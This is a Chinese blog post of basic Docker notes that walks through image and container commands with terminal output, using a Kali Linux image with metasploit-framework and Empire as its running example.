<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    

    <title>
      Docker笔记—基础篇 | Z3R0YU 
    </title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
      <meta name="author" content="z3r0yu">
    
    

    <meta name="description" content="概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。
Docker容器：一个轻量级沙箱，来运行和隔离应用
Docker仓库：用来存储Docker镜像文件的地方
Docker中用于区分的方式是id或者name:tag
安装官方文档：https://docs.docker.com/
操作镜像####1.获取镜像（默认是从docker hub网站进行镜像的获取）">
<meta property="og:type" content="article">
<meta property="og:title" content="Docker笔记—基础篇 | Z3R0YU">
<meta property="og:url" content="http://zer0yu.github.io/2017/12/02/Docker笔记—基础篇/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。
Docker容器：一个轻量级沙箱，来运行和隔离应用
Docker仓库：用来存储Docker镜像文件的地方
Docker中用于区分的方式是id或者name:tag
安装官方文档：https://docs.docker.com/
操作镜像####1.获取镜像（默认是从docker hub网站进行镜像的获取）">
<meta property="og:updated_time" content="2017-12-04T13:16:56.040Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Docker笔记—基础篇 | Z3R0YU">
<meta name="twitter:description" content="概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。
Docker容器：一个轻量级沙箱，来运行和隔离应用
Docker仓库：用来存储Docker镜像文件的地方
Docker中用于区分的方式是id或者name:tag
安装官方文档：https://docs.docker.com/
操作镜像####1.获取镜像（默认是从docker hub网站进行镜像的获取）">
    
    
    
      <link rel="icon" type="image/x-icon" href="/favicon.png">
    
    <link rel="stylesheet" href="/css/uno.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/archive.css">
    <link rel="stylesheet" href="/css/china-social-icon.css">

</head>
<body>

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    

<header class="panel-cover panel-cover--collapsed">


  <div class="panel-main">

  
    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">

        

        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Z3R0YU</a></h1>
        <hr class="panel-cover__divider" />

        

        <div class="navigation-wrapper">

          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">

              
                
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
              
                
                <li class="navigation__item"><a href="/archives" title="" class="">归档</a></li>
              

            </ul>
          </nav>

          <!-- ----------------------------
To add a new social icon simply duplicate one of the list items from below
and change the class in the <i> tag to match the desired social network
and then add your link to the <a>. Here is a full list of social network
classes that you can use:

    icon-social-500px
    icon-social-behance
    icon-social-delicious
    icon-social-designer-news
    icon-social-deviant-art
    icon-social-digg
    icon-social-dribbble
    icon-social-facebook
    icon-social-flickr
    icon-social-forrst
    icon-social-foursquare
    icon-social-github
    icon-social-google-plus
    icon-social-hi5
    icon-social-instagram
    icon-social-lastfm
    icon-social-linkedin
    icon-social-medium
    icon-social-myspace
    icon-social-path
    icon-social-pinterest
    icon-social-rdio
    icon-social-reddit
    icon-social-skype
    icon-social-spotify
    icon-social-stack-overflow
    icon-social-steam
    icon-social-stumbleupon
    icon-social-treehouse
    icon-social-tumblr
    icon-social-twitter
    icon-social-vimeo
    icon-social-xbox
    icon-social-yelp
    icon-social-youtube
    icon-social-zerply
    icon-mail

-------------------------------->

<!-- add social info here -->



<nav class="cover-navigation navigation--social">
  <ul class="navigation">

      <!-- Github -->
      <li class="navigation__item">
        <a href="https://github.com/zer0yu" title="z3r0yu on GitHub">
          <i class='icon icon-social-github'></i>
          <span class="label">GitHub</span>
        </a>
      </li>

    <!-- China social icon -->
    <!--

      <li class="navigation__item">
        <a href="" title="">
          <i class='icon cs-icon-douban'></i>
          <span class="label">Douban</span>
        </a>
      </li>
    -->

      <li class="navigation__item">
        <a href="https://weibo.com/Z3r0yu" title="">
          <i class='icon cs-icon-weibo'></i>
          <span class="label">Weibo</span>
        </a>
      </li>





  </ul>
</nav>



        </div>

      </div>

    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner entry">
            

<article class="post-container post-container--single">

  <header class="post-header">
    
    <h1 class="post-title">Docker笔记—基础篇</h1>

    

    <div class="post-meta">
      <time datetime="2017-12-02" class="post-meta__date date">2017-12-02</time> 

      <span class="post-meta__tags tags">

          

          

      </span>
    </div>
    
    

  </header>

  <section id="post-content" class="article-content post">
    <h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。</p>
<p>Docker容器：一个轻量级沙箱，来运行和隔离应用</p>
<p>Docker仓库：用来存储Docker镜像文件的地方</p>
<p>Docker中用于区分的方式是id或者name:tag</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官方文档：<a href="https://docs.docker.com/" target="_blank" rel="external">https://docs.docker.com/</a></p>
<h3 id="操作镜像"><a href="#操作镜像" class="headerlink" title="操作镜像"></a>操作镜像</h3><p>####1.获取镜像（默认是从docker hub网站进行镜像的获取）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker pull kalilinux/kali-linux-docker</div><div class="line"><span class="comment">#如果想使用非官方仓库需要指定仓库完整的地址</span></div><div class="line">docker pull hub.c.163.com/public/ubuntu:14.04</div></pre></td></tr></table></figure>
<p>建议：使用中科大镜像源    <code>https://docker.mirrors.ustc.edu.cn</code></p>
<p>附带：<a href="https://segmentfault.com/a/1190000006146697" target="_blank" rel="external">在国内 docker build 的正确姿势</a></p>
<p>####2.列出镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure>
<p>REPOSITORY:来自哪个仓库</p>
<p>TAG:镜像的标签信息，能标示来自同一仓库的不同镜像</p>
<p>IMAGE ID:镜像的ID，此字段唯一标示了镜像</p>
<p>CREATED:创建时间</p>
<p>SIZE:镜像的大小</p>
<h4 id="3-添加镜像标签"><a href="#3-添加镜像标签" class="headerlink" title="3.添加镜像标签"></a>3.添加镜像标签</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#对kalilinux/kali-linux-docker:latest添加新的标签kalilinux:latest</span></div><div class="line">➜  ~ docker tag kalilinux/kali-linux-docker:latest kalilinux:latest</div><div class="line"><span class="comment">#别名不一样但是两者的镜像文件是一样的（id相同）</span></div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</div><div class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure>
<h4 id="4-查看详细信息"><a href="#4-查看详细信息" class="headerlink" title="4.查看详细信息"></a>4.查看详细信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker inspect kalilinux:latest</div><div class="line">[</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Id"</span>: <span class="string">"sha256:8ececeaf404d5d63d4e9bf870f4340516f3be040e5db6c005ac8cf96d2c43536"</span>,</div><div class="line">        <span class="string">"RepoTags"</span>: [</div><div class="line">            <span class="string">"kalilinux/kali-linux-docker:latest"</span>,</div><div class="line">            <span class="string">"kalilinux:latest"</span></div><div class="line">        ],</div><div class="line">        <span class="string">"RepoDigests"</span>: [</div><div class="line">            <span class="string">"kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d"</span></div><div class="line">        ],</div><div class="line">        ......</div><div class="line">        <span class="string">"Metadata"</span>: &#123;</div><div class="line">            <span class="string">"LastTagTime"</span>: <span class="string">"2017-12-02T04:56:53.8185955Z"</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">]</div></pre></td></tr></table></figure>
<h4 id="5-查看镜像历史"><a href="#5-查看镜像历史" class="headerlink" title="5.查看镜像历史"></a>5.查看镜像历史</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker <span class="built_in">history</span> kalilinux:latest</div><div class="line">IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</div><div class="line">8ececeaf404d        9 months ago        /bin/sh -c <span class="comment">#(nop)  CMD ["/bin/bash"]            0B</span></div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   251MB</div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="comment">#(nop)  ENV DEBIAN_FRONTEND=non...   0B</span></div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="built_in">echo</span> <span class="string">"deb http://http.kali.org/...   134B</span></div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c #(nop)  MAINTAINER steev@kali.org    0B</div><div class="line">&lt;missing&gt;           11 months ago       /bin/sh -c #(nop)  CMD ["/bin/bash<span class="string">"]            0B</span></div><div class="line">&lt;missing&gt;           11 months ago       /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   286MB</div></pre></td></tr></table></figure>
<h4 id="6-搜索镜像"><a href="#6-搜索镜像" class="headerlink" title="6.搜索镜像"></a>6.搜索镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#搜索所有自动创建的评价为1+的带kali关键字的镜像</span></div><div class="line">➜  ~ docker search --automated <span class="_">-s</span> 3 kali</div><div class="line">Flag --automated has been deprecated, use --filter=is-automated=<span class="literal">true</span> instead</div><div class="line">Flag --stars has been deprecated, use --filter=stars=3 instead</div><div class="line">NAME                           DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</div><div class="line">kalilinux/kali-linux-docker    Kali Linux Rolling Distribution Base Image      361                                     [OK]</div><div class="line">linuxkonsult/kali-metasploit   Kali base image with metasploit                 54                                      [OK]</div><div class="line">jasonchaffee/kali-linux        Kali Linux Docker Container with the kali-...   8                                       [OK]</div><div class="line">brimstone/kali                                                                 6                                       [OK]</div><div class="line">adamoss/kali2-metasploit       Kali2 Automated Build                           4                                       [OK]</div><div class="line">wsec/kali-metasploit           Official Kali Base image + Metasploit           3                                       [OK]</div><div class="line">kalinon/comicstreamer          ComicStreamer is a media server app <span class="keyword">for</span> sh...   3                                       [OK]</div></pre></td></tr></table></figure>
<h4 id="7-删除镜像"><a href="#7-删除镜像" class="headerlink" title="7.删除镜像"></a>7.删除镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#如果同一个标签有多个tag，那么docker rmi只是删除tag而已</span></div><div class="line"><span class="comment">#如果docker rmi id的话，会先删除所有的tag然后删除镜像</span></div><div class="line"><span class="comment">#但是若该镜像的容器存在，也是无法删除的，如果想强制删除可以使用docker rmi -f id</span></div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</div><div class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</div><div class="line">➜  ~ docker rmi kalilinux/kali-linux-docker:latest</div><div class="line">Untagged: kalilinux/kali-linux-docker:latest</div><div class="line">Untagged: kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d</div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure>
<h4 id="8-创建镜像"><a href="#8-创建镜像" class="headerlink" title="8.创建镜像"></a>8.创建镜像</h4><p>1）基于已有镜像的容器创建</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#我们先创建容器并安装metasploit-framework</span></div><div class="line">➜  ~ docker run -it kalilinux:latest /bin/bash</div><div class="line">root@de573c5f5dc6:/<span class="comment"># apt update &amp;&amp; apt install metasploit-framework</span></div><div class="line">root@de573c5f5dc6:/<span class="comment">#exit</span></div><div class="line"><span class="comment">#记住id为de573c5f5dc6</span></div><div class="line"><span class="comment">#docker commit -m "改动信息" -a "作者名称" id REPOSITORY:TAG</span></div><div class="line">➜  ~ docker commit -m <span class="string">"install msf"</span> <span class="_">-a</span> <span class="string">"zeroyu"</span> de573c5f5dc6 kalilinux:0.1</div><div class="line">sha256:66a6770d79d88c826b2e4a38b98037c14de0b9d2ce897307dc30afbf675ce51a</div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux           0.1                 66a6770d79d8        21 seconds ago      2.54GB</div><div class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure>
<p>2）基于本地模板导入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker import ...</div></pre></td></tr></table></figure>
<h4 id="9-存出和载入镜像"><a href="#9-存出和载入镜像" class="headerlink" title="9.存出和载入镜像"></a>9.存出和载入镜像</h4><p>1）存出镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker save -o docker_for_msf.tar kalilinux:0.1</div></pre></td></tr></table></figure>
<p>2）载入镜像</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker load --input docker_for_msf.tar</div><div class="line"><span class="comment">#或则</span></div><div class="line">docker load &lt; docker_for_msf.tar</div></pre></td></tr></table></figure>
<h4 id="10-上传镜像"><a href="#10-上传镜像" class="headerlink" title="10.上传镜像"></a>10.上传镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker push kalilinux:0.1</div></pre></td></tr></table></figure>
<h3 id="操作容器"><a href="#操作容器" class="headerlink" title="操作容器"></a>操作容器</h3><h4 id="1-创建容器"><a href="#1-创建容器" class="headerlink" title="1.创建容器"></a>1.创建容器</h4><p>1）新建容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#docker create新建的容器处于静止，可以使用docker start来启动它</span></div><div class="line"><span class="comment">#-i 保持标准输入打开   -t分配一个伪终端</span></div><div class="line">➜  ~ docker create -it kalilinux:0.1</div><div class="line">2bc48b88a424c8056fe9e6311848d5850c4e46008feec99ee095bc341ae9adaf</div><div class="line"><span class="comment">#查看处于终止状态的容器</span></div><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES</div><div class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 seconds ago       Created                                      frosty_poitras</div><div class="line">de573c5f5dc6        kalilinux:latest    <span class="string">"/bin/bash"</span>         5 hours ago         Exited (0) 5 hours ago                       happy_goldberg</div></pre></td></tr></table></figure>
<p>2）启动容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#docker start id 启动相应的容器</span></div><div class="line"><span class="comment">#docker ps 查看运行中的容器</span></div><div class="line">➜  ~ docker start 2bc48b88a424</div><div class="line">2bc48b88a424</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         9 minutes ago       Up 8 seconds                            frosty_poitras</div></pre></td></tr></table></figure>
<p>3）新建并启动容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#docker run = docker create + docker start</span></div><div class="line"><span class="comment">#run的过程：1.检查镜像是否存在，不存在就下载；2.用镜像创建容器；挂载可读写层；3.分配虚拟接口</span></div><div class="line"><span class="comment">#4.分配IP；5.运行指定程序；6.执行完自动终止</span></div><div class="line">➜  ~ docker run kalilinux:0.1 /bin/<span class="built_in">echo</span> <span class="string">'zeroyu'</span></div><div class="line">zeroyu</div><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES</div><div class="line">d6a6045c4f8b        kalilinux:0.1       <span class="string">"/bin/echo zeroyu"</span>   3 minutes ago       Exited (0) 3 minutes ago                       cocky_kirch</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="comment">#常用命令如下</span></div><div class="line">➜  ~ docker run -it kalilinux:0.1 /bin/bash</div><div class="line">root@2ed8aa5354f1:/<span class="comment"># ps</span></div><div class="line">  PID TTY          TIME CMD</div><div class="line">    1 pts/0    00:00:00 bash</div><div class="line">    7 pts/0    00:00:00 ps</div><div class="line">root@2ed8aa5354f1:/<span class="comment"># exit</span></div><div class="line"><span class="built_in">exit</span></div><div class="line"><span class="comment">#推出后自动处于终止状态</span></div><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND              CREATED              STATUS                      PORTS               NAMES</div><div class="line">2ed8aa5354f1        kalilinux:0.1       <span class="string">"/bin/bash"</span>          About a minute ago   Exited (0) 48 seconds ago                       goofy_bardeen</div></pre></td></tr></table></figure>
<p>4）守护态运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#在后台运行容器</span></div><div class="line">➜  ~ docker run <span class="_">-d</span> kalilinux:0.1 /bin/sh -c <span class="string">"while true ; do echo zeroyu ; sleep 1 ; done"</span></div><div class="line">88f12c0725a466ba6d8f08f34<span class="built_in">fc</span>8e9ac263ecafdff0a9e7282d7e9bb4073e6a0</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</div><div class="line">88f12c0725a4        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   7 seconds ago       Up 7 seconds                            sleepy_kowalevski</div><div class="line">➜  ~ docker logs 88f12c0725a4</div><div class="line">zeroyu</div><div class="line">zeroyu</div><div class="line">zeroyu</div><div class="line">......</div></pre></td></tr></table></figure>
<h4 id="2-终止容器"><a href="#2-终止容器" class="headerlink" title="2.终止容器"></a>2.终止容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#id为88f12c0725a4但是可以使用前几位来简单表示</span></div><div class="line">➜  ~ docker stop 88</div><div class="line">88</div><div class="line"><span class="comment">#查看所有处于终止态的id</span></div><div class="line">➜  ~ docker ps -qa</div><div class="line">073ff4e1dac7</div><div class="line"><span class="comment">#处于终止状态可以使用start来重新启动</span></div><div class="line">➜  ~ docker start 073</div><div class="line">073</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES</div><div class="line">073ff4e1dac7        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   About a minute ago   Up About a minute                       cranky_benz</div><div class="line"><span class="comment">#restart可以先终止再重新启动</span></div><div class="line">➜  ~ docker restart 073</div><div class="line">073</div></pre></td></tr></table></figure>
<h4 id="3-进入容器"><a href="#3-进入容器" class="headerlink" title="3.进入容器"></a>3.进入容器</h4><p>处于守护态（-d参数）的容器会在后台运行，但是你无法到信息，也无法进行操作。此时，要进入容器进行工作，要使用attach或者exec命令。</p>
<p>1）    使用attach命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#容器还可以使用name来唯一辨识</span></div><div class="line">➜  ~ docker run -itd kalilinux:0.1</div><div class="line">77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         20 seconds ago      Up 21 seconds                           stupefied_gates</div><div class="line">➜  ~ docker attach stupefied_gates</div><div class="line">root@77e93d18a6a5:/<span class="comment">#</span></div></pre></td></tr></table></figure>
<p>2）使用exec命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                          PORTS               NAMES</div><div class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         5 minutes ago       Exited (0) About a minute ago                       stupefied_gates</div><div class="line">➜  ~ docker start 77e</div><div class="line">77e</div><div class="line">➜  ~ docker <span class="built_in">exec</span> -it 77e93d18a6a5 /bin/bash</div><div class="line">root@77e93d18a6a5:/<span class="comment">#</span></div></pre></td></tr></table></figure>
<p>####4.删除容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 minutes ago       Up About a minute                       stupefied_gates</div><div class="line">➜  ~ docker rm 77e93d18a6a5</div><div class="line">Error response from daemon: You cannot remove a running container 77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360. Stop the container before attempting removal or force remove</div><div class="line">➜  ~ docker stop 77e93d18a6a5</div><div class="line">77e93d18a6a5</div><div class="line">➜  ~ docker rm 77e93d18a6a5</div><div class="line">77e93d18a6a5</div></pre></td></tr></table></figure>
<h4 id="5-导入和导出容器"><a href="#5-导入和导出容器" class="headerlink" title="5.导入和导出容器"></a>5.导入和导出容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#导出容器</span></div><div class="line"><span class="comment">#无论这个容器是否正在运行都是可以导出的</span></div><div class="line">➜  ~ docker <span class="built_in">export</span> -o test.tar 77e93d18a6a5</div><div class="line"><span class="comment">#或者执行</span></div><div class="line">➜  ~ docker <span class="built_in">export</span> 77e93d18a6a5 &gt; test.tar </div><div class="line"></div><div class="line"><span class="comment">#导入容器</span></div><div class="line">➜  ~ docker import test.tar - <span class="built_in">test</span>/kalilinux:v1.0</div></pre></td></tr></table></figure>
<h3 id="Docker数据管理"><a href="#Docker数据管理" class="headerlink" title="Docker数据管理"></a>Docker数据管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用-v标记挂在本地的tmp目录到容器中的/opt/tmp_test</span></div><div class="line"><span class="comment">#使用rw（默认也是这种方式）来指定可读写</span></div><div class="line"><span class="comment">#下面的#表示的不是注释</span></div><div class="line">➜  ~ docker run -it -P  --name db -v /tmp:/opt/tmp_test:rw kalilinux:0.1 /bin/sh</div><div class="line"><span class="comment"># ls</span></div><div class="line">bin  boot  dev	etc  home  lib	lib64  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var</div><div class="line"><span class="comment"># cd opt</span></div><div class="line"><span class="comment"># ls</span></div><div class="line">tmp_test</div><div class="line"><span class="comment"># cd tmp_test</span></div><div class="line"><span class="comment"># ls</span></div><div class="line">com.apple.launchd.0fGM76e6ao  com.apple.launchd.UWfVYRXkwo  powerlog</div><div class="line">com.apple.launchd.AkQGotnulN  pip-FfQw68-unpack		    zeroyu.txt</div><div class="line"><span class="comment">#</span></div></pre></td></tr></table></figure>
<h3 id="Docker端口映射"><a href="#Docker端口映射" class="headerlink" title="Docker端口映射"></a>Docker端口映射</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-P是指映射到任意端口</span></div><div class="line"><span class="comment">#-p加端口号，则将端口映射到所有地址的相应端口</span></div><div class="line">➜  ~ docker run -it <span class="_">-d</span> -p 5000:5000 kalilinux:v0.2</div><div class="line">23e91a40cb124720b1dba81371a275169124cbff2778120b4350470fa79a0d91</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</div><div class="line">23e91a40cb12        kalilinux:v0.2      <span class="string">"/bin/bash"</span>         12 seconds ago      Up 11 seconds       0.0.0.0:5000-&gt;5000/tcp   boring_volhard</div><div class="line">➜  ~ docker attach boring_volhard</div><div class="line">root@23e91a40cb12:/<span class="comment"># cd home/Empire/</span></div><div class="line">root@23e91a40cb12:/home/Empire<span class="comment"># ls</span></div><div class="line">LICENSE  README.md  changelog  data  empire  lib  setup</div><div class="line">root@23e91a40cb12:/home/Empire<span class="comment">#</span></div></pre></td></tr></table></figure>
<p>###附例</p>
<p>在vps中的docker上使用empire进行渗透测试(metasploit同理)</p>
